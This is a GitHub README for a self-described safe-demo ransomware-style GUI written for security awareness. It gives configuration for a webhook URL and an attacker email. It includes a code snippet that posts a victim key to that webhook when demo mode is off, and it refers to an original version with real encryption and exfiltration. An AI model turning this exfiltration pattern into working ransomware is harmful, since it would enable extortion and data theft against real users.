# Ransomware GUI (SAFE DEMO)

![Security Awareness](https://img.shields.io/badge/Security-Awareness-red?style=flat-square\&logo=hackaday)
![Python 3.x](https://img.shields.io/badge/Python-3.x-blue?style=flat-square\&logo=python)
![Tkinter GUI](https://img.shields.io/badge/GUI-Tkinter-lightgrey?style=flat-square\&logo=python)
![Educational](https://img.shields.io/badge/Use-Educational-green?style=flat-square\&logo=bookstack)
![Demo Mode](https://img.shields.io/badge/Mode-Demo-blueviolet?style=flat-square\&logo=demo)
![VM Only](https://img.shields.io/badge/VM-only-Lab--Safe-lightgrey?style=flat-square\&logo=virtualbox)
![Network Isolated](https://img.shields.io/badge/Network-Isolated-yellow?style=flat-square\&logo=cloudflare)
![Audit Friendly](https://img.shields.io/badge/Audit-Friendly-orange?style=flat-square\&logo=github)

---

> **⚠️ CRITICAL DISCLAIMER — READ FIRST**
>
> This repository contains a **SAFE DEMO** of a ransomware-style GUI for educational and defensive research only. The original destructive behaviors (real encryption + exfiltration) are **not** included in the demo. **Do not** run any destructive code on real systems or networks. Use isolated virtual machines, snapshots, and demo/sanitized branches only.

---

## 📖 What this README covers

* 🎭 Safe, non-destructive demo of the original GUI.
* 🔗 How to configure the demo's unique webhook URL **safely** (local/test only).
* 💻 How to run the demo inside an isolated VM.
* 📂 File usage and structure guidelines for safe publishing.

---

## 🖼️ Overview (safe demo)

This repo provides a GUI demonstration (non-destructive) that mimics the user experience of a ransomware UI for **training, detection research, and awareness**. All encryption and network calls are simulated. The demo preserves UI flows and logs so defenders and students can study indicators and response procedures without risk.

---

## ⚙️ Configuration — change the unique webhook URL (SAFE)

**Important:** Changing `WEBHOOK_URL` is allowed **only** for safe testing inside isolated environments. Never point demo or original code to public services when testing destructive behavior.

1. Open the demo script in your isolated VM (example: `Ran.py`).
2. Locate the configuration block near the top:

```python
# Demo configuration
DEMO_MODE = True                # must be True for safe demo
WEBHOOK_URL = "DEMO_MODE"     # keep DEMO_MODE to avoid any network exfiltration
HACKER_EMAIL = "shadow.cortex@demo.local"
```

3. To simulate posting the key to a controlled receiver on the *same isolated network*, set `WEBHOOK_URL` to a localhost/VM-only address such as `http://127.0.0.1:8080/receive` only if you have a local receiver running. Example:

```python
WEBHOOK_URL = "http://127.0.0.1:8080/receive"  # only in fully isolated lab
```

4. Confirm that `DEMO_MODE` is `True` or that demo code checks `DEMO_MODE` before any real network call. The demo should log any exfiltration attempt rather than performing it.

**Demo-safe code pattern** (example):

```python
if DEMO_MODE or WEBHOOK_URL == "DEMO_MODE":
    log("[DEMO] Skipping network exfiltration (DEMO_MODE active).")
else:
    # only in fully isolated lab with local receiver
    requests.post(WEBHOOK_URL, data={"key": fake_key, "id": "victim_01"})
```

---

## ▶️ How to run the SAFE demo

1. 🖥️ Prepare an isolated VM (VirtualBox/VMware). Disable Internet connectivity and host-guest bridging.
2. 📸 Create a snapshot before running anything.
3. 📂 Clone the repository in the VM and switch to the `demo` folder or branch.
4. ▶️ Run the demo GUI:

```bash
python3 demo/Ran.py
```

You will see UI logs that simulate scanning, key generation, simulated exfiltration (logged), and simulated recovery flows. **No files are modified.**

---
